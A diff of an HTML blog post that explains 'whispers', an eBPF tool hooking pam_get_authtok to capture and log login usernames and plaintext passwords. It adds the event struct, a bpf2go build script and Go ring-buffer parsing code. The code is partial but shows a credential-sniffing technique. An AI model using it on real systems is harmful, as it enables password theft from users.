@@ -204,7 +204,7 @@
       <span class="post-author">Peter McConnell</span>
     
     
-      <span class="post-reading-time">:: 13 min read (2596 words)</span>
+      <span class="post-reading-time">:: 14 min read (2908 words)</span>
     
   </div>
 
@@ -404,6 +404,13 @@ What Are BPF Maps?</p>
   __uint(max_entries, <span style="color:#ae81ff">256</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span>);
 } rb SEC(<span style="color:#e6db74">&#34;.maps&#34;</span>);
 
+<span style="color:#75715e">// and we will use this struct to store the items for our bpf map
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _event_t {
+    <span style="color:#66d9ef">int</span>  pid;
+    <span style="color:#66d9ef">char</span> comm[<span style="color:#ae81ff">16</span>];
+    <span style="color:#66d9ef">char</span> username[<span style="color:#ae81ff">80</span>];
+    <span style="color:#66d9ef">char</span> password[<span style="color:#ae81ff">80</span>];
+} event_t;
 ...
 
 SEC(<span style="color:#e6db74">&#34;uretprobe/pam_get_authtok&#34;</span>)
@@ -434,7 +441,25 @@ SEC(<span style="color:#e6db74">&#34;uretprobe/pam_get_authtok&#34;</span>)
   }
   <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 };
-</code></pre></div><p>To handle compiling this code, given we&rsquo;re going to be using Golang we&rsquo;ll define a <code>go generate</code> later which will point to a bash script which will handle compilation.</p>
+</code></pre></div><p>To handle compiling this code, given we&rsquo;re going to be using Golang we&rsquo;ll define a <code>go generate</code> later which will point to a bash script which will handle compilation. For now though we can create the <code>gen.sh</code> which will handle the compilation:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/usr/bin/env bash
+</span><span style="color:#75715e"></span>
+set -e
+set -x
+
+<span style="color:#75715e"># Dynamically find kernel headers. Adjust this line according to your needs.</span>
+KERNEL_HEADERS<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>find /usr/src -name <span style="color:#e6db74">&#34;linux-headers-</span><span style="color:#66d9ef">$(</span>uname -r<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> -type d | head -n 1<span style="color:#66d9ef">)</span>
+
+<span style="color:#75715e"># Include directory for bpf_helpers.h. This might need adjustments.</span>
+BPF_HELPERS_DIR<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/usr/src/linux-headers-</span><span style="color:#66d9ef">$(</span>uname -r<span style="color:#66d9ef">)</span><span style="color:#e6db74">/tools/bpf/resolve_btfids/libbpf/include/&#34;</span>
+
+<span style="color:#75715e"># Run bpf2go with dynamic include paths</span>
+go run github.com/cilium/ebpf/cmd/bpf2go -target amd64 bpf <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    ../../bpf/uretprobe.c -- <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    -I<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>KERNEL_HEADERS<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    -I<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>BPF_HELPERS_DIR<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    -I../../bpf/headers
+</code></pre></div><p>This will be invoked by <code>go build</code> whenever it encounters a <code>// go generate ../path/to/gen.sh</code> directive. <code>go generate</code> is a command provided by the Go toolchain that automates the generation of code before the build process. It scans Go source files for special comments that specify commands to be run at generate time. These commands can invoke any process but are commonly used to generate Go code, making it a perfect fit for integrating eBPF programs into Go applications.</p>
 <h4 id="golang-code">Golang code<a href="#golang-code" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
 <p>This section delves into the Go component of whispers, which serves as the user-space counterpart to the eBPF program. It outlines how to leverage Go to load the eBPF program, attach probes, read from eBPF maps, and process the captured credential data for monitoring and analysis purposes.</p>
 <p>Ensure your Go environment is set up with the necessary dependencies:</p>
@@ -442,13 +467,13 @@ SEC(<span style="color:#e6db74">&#34;uretprobe/pam_get_authtok&#34;</span>)
 </code></pre>
 <p>The Go codebase for whispers is structured as follows:</p>
 <pre><code>cmd/: Contains the CLI interface for whispers.
-pkg/config: Defines configuration structures and parsing logic.
+pkg/config: Defines configuration structures.
 pkg/whispers: Implements the core functionality for loading and interacting with the eBPF program.
 </code></pre>
 <p>Dependencies are defined in <code>go.mod</code> and can be pulled with <code>go mod tidy</code>.</p>
 <p>This article will only touch on the most interesting parts of the code. The source can be read at <a href="https://github.com/peter-mcconnell/whispers/blob/main/pkg/whispers/whispers.go">https://github.com/peter-mcconnell/whispers/blob/main/pkg/whispers/whispers.go</a>.</p>
 <p>We&rsquo;re using cilium ebpf to handle loading our BPF program and interacting with the BPF maps. In the following, <code>bpfObjects</code> and <code>loadBpfObjects</code> are defined in the auto-generated file <code>bpf_x86_bpfel.go</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-golang" data-lang="golang"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">Listen</span>(<span style="color:#a6e22e">ctx</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">Context</span>, <span style="color:#a6e22e">cfg</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">Config</span>) <span style="color:#66d9ef">error</span> {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">Listen</span>(<span style="color:#a6e22e">ctx</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">Context</span>, <span style="color:#a6e22e">cfg</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">Config</span>) <span style="color:#66d9ef">error</span> {
     <span style="color:#a6e22e">objs</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">bpfObjects</span>{}
     <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">loadBpfObjects</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">objs</span>, <span style="color:#66d9ef">nil</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
         <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">err</span>
@@ -459,7 +484,7 @@ pkg/whispers: Implements the core functionality for loading and interacting with
 }
 </code></pre></div><p>The above snippet demonstrates loading the eBPF program and ensuring it is correctly cleaned up upon termination.</p>
 <p>whispers attaches uretprobes to target functions (e.g., pam_get_authtok) also using the cilium/ebpf library:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-golang" data-lang="golang"><span style="color:#a6e22e">ex</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">link</span>.<span style="color:#a6e22e">OpenExecutable</span>(<span style="color:#a6e22e">cfg</span>.<span style="color:#a6e22e">BinPath</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a6e22e">ex</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">link</span>.<span style="color:#a6e22e">OpenExecutable</span>(<span style="color:#a6e22e">cfg</span>.<span style="color:#a6e22e">BinPath</span>)
 <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
     <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">err</span>
 }
@@ -469,8 +494,8 @@ pkg/whispers: Implements the core functionality for loading and interacting with
 }
 <span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">up</span>.<span style="color:#a6e22e">Close</span>()
 <span style="color:#f92672">...</span>
-</code></pre></div><p>The Go code uses a ring buffer to read events captured by the eBPF program:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-golang" data-lang="golang"><span style="color:#a6e22e">rb</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ringbuf</span>.<span style="color:#a6e22e">NewReader</span>(<span style="color:#a6e22e">objs</span>.<span style="color:#a6e22e">Rb</span>)
+</code></pre></div><p>The Go code reads from the BPF map (a ring buffer) to read events captured by the eBPF program:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a6e22e">rb</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ringbuf</span>.<span style="color:#a6e22e">NewReader</span>(<span style="color:#a6e22e">objs</span>.<span style="color:#a6e22e">Rb</span>)
 <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
     <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;failed to open ring buffer reader: %v&#34;</span>, <span style="color:#a6e22e">err</span>)
 }
@@ -484,8 +509,44 @@ pkg/whispers: Implements the core functionality for loading and interacting with
         <span style="color:#f92672">...</span>
     }
 }()
+</code></pre></div><p>We&rsquo;ll need to handle reading the raw data from the BPF map and converting it into something we can easily interact with in Golang:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#f92672">...</span>
+<span style="color:#75715e">// this needs to perfectly match the structure of our BPF map items (defined in our .h file as _event_t)
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">eventT</span> <span style="color:#66d9ef">struct</span> {
+	<span style="color:#a6e22e">Pid</span>      <span style="color:#66d9ef">int32</span>
+	<span style="color:#a6e22e">Comm</span>     [<span style="color:#ae81ff">16</span>]<span style="color:#66d9ef">byte</span>
+	<span style="color:#a6e22e">Username</span> [<span style="color:#ae81ff">80</span>]<span style="color:#66d9ef">byte</span>
+	<span style="color:#a6e22e">Password</span> [<span style="color:#ae81ff">80</span>]<span style="color:#66d9ef">byte</span>
+}
+<span style="color:#f92672">...</span>
+<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">byteArrayToString</span>(<span style="color:#a6e22e">b</span> []<span style="color:#66d9ef">byte</span>) <span style="color:#66d9ef">string</span> {
+	<span style="color:#a6e22e">n</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span>, <span style="color:#a6e22e">v</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">b</span> {
+		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">v</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> {
+			<span style="color:#a6e22e">n</span> = <span style="color:#a6e22e">i</span>
+			<span style="color:#66d9ef">break</span>
+		}
+	}
+	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">n</span> <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> {
+		<span style="color:#a6e22e">n</span> = len(<span style="color:#a6e22e">b</span>)
+	}
+	<span style="color:#66d9ef">return</span> string(<span style="color:#a6e22e">b</span>[:<span style="color:#a6e22e">n</span>])
+}
+
+<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">parseEventData</span>(<span style="color:#a6e22e">data</span> []<span style="color:#66d9ef">byte</span>) <span style="color:#f92672">*</span><span style="color:#a6e22e">eventT</span> {
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">event</span> <span style="color:#a6e22e">eventT</span>
+
+	<span style="color:#66d9ef">if</span> len(<span style="color:#a6e22e">data</span>) <span style="color:#f92672">&gt;=</span> int(<span style="color:#a6e22e">unsafe</span>.<span style="color:#a6e22e">Sizeof</span>(<span style="color:#a6e22e">eventT</span>{})) {
+		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">binary</span>.<span style="color:#a6e22e">Read</span>(<span style="color:#a6e22e">bytes</span>.<span style="color:#a6e22e">NewReader</span>(<span style="color:#a6e22e">data</span>), <span style="color:#a6e22e">binary</span>.<span style="color:#a6e22e">LittleEndian</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">event</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">nil</span> {
+			<span style="color:#66d9ef">return</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">event</span>
+		}
+	}
+
+	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
+}
+<span style="color:#f92672">...</span>
 </code></pre></div><p>After reading events from the ring buffer, whispers processes and logs the captured credentials:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-golang" data-lang="golang"><span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Event: PID: %d, Comm: %s, Username: %s, Password: %s&#34;</span>,
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Event: PID: %d, Comm: %s, Username: %s, Password: %s&#34;</span>,
     <span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">Pid</span>,
     <span style="color:#a6e22e">byteArrayToString</span>(<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">Comm</span>[:]),
     <span style="color:#a6e22e">byteArrayToString</span>(<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">Username</span>[:]),
